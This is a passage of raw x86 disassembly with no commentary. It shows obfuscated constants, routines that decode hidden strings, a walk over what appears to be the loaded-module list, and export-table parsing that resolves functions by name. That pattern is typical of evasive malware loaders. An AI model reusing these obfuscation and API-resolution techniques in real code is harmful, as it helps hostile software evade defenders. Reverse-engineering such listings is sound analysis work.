  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
